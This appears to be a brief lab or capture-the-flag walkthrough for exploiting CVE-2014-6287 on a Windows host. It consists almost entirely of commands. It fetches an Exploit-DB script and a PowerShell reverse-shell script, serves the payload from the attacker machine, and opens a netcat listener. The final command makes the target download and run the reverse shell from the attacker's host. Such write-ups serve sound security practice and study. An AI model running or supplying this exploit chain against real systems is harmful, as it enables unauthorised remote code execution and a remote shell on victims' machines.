# CVE : 2014-6287 ([49125](https://www.exploit-db.com/exploits/49125))

You can execute arbitrary commands on the remote Windows host.

## 1. Download the python script to kali
```
wget https://www.exploit-db.com/raw/49125 -O /tmp/49125.py
```

## 2. Download the powershell script to kali.
Local IP and port in the script needs to be changed.
```
wget https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1 -O ~/Downloads/steel/mini-reverse.ps1
```

## 3. Start python web server in kali
```
cd ~/Downloads/steel/
python3 -m http.server 80
```

## 4. Start netcat listener
```
rlwrap nc -lvnp ${lport}
```

## 5. Execute the script.
Execute the commands passed as the third argument.
```
cd /tmp
python3 49125.py $rhost [RPORT] "C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -c wget 'http://${lhost}/mini-reverse.ps1' -outfile 'C:\Users\Bill\Desktop\mini-reverse.ps1'; C:\Users\Bill\Desktop\mini-reverse.ps1" 
```
